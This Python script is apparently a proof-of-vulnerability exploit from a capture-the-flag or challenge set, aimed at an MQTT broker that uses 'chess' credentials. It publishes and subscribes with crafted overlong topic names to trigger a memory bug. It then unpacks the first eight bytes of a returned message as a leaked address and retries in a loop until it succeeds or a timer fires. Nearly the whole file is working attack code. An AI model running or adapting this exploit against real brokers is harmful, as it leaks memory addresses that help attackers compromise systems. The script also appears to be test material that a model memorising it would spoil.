import sys
import socket
import random
import time
import string
import base64
import os
import string
import struct
import signal

import paho.mqtt.publish as publish
import paho.mqtt.subscribe as subscribe
import paho.mqtt.client as mqtt
import paho

pwd = ''
homedir = ''

subs = []

success = 0

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')

    exit(1)

def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))

    topic = 'chess/'
    topic += 'a' * (63 - len(topic))
    client.subscribe( (topic, 3) )

    topic = 'chess/'
    topic += ('bbbbbbbb' + 'cccccccc' + 'dddddddd' + 'eeeeeeee') * 2
    client.subscribe( (topic, 3) )

def on_message(client, userdata, msg):
    global success
    print(msg.topic+" "+str(msg.payload))

    y = struct.unpack('Q', msg.payload[:8])[0]

    print('[ADDRESS] = %s' %(hex(y)))

    print('[SUCCESS] POV Succeeded')

    success = 1
    exit(0)

def attempt_it(HOST, PORT):
    client = mqtt.Client(client_id="yolo")
    client.on_connect = on_connect
    client.on_message = on_message

    client.username_pw_set('chess', 'chess')

    client.connect(HOST, PORT, 60)

    client.loop_start()

    topic = 'chess/'
    topic += ('bbbbbbbb' + 'cccccccc' + 'dddddddd' + 'eeeeeeee') * 2

    client.publish(topic, 'a'*63)
    topic = 'chess/'
    topic += 'c' * (63 - len(topic))
    client.subscribe( (topic, 3) )

    time.sleep(2)

    client.disconnect()

    client.loop_stop()

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(120)

    while True:
        attempt_it(HOST, PORT)

        if success == 1:
            exit(0)

    print('[FAIL] POV failed (unless it succeeded)')

if __name__ == '__main__':
    main()
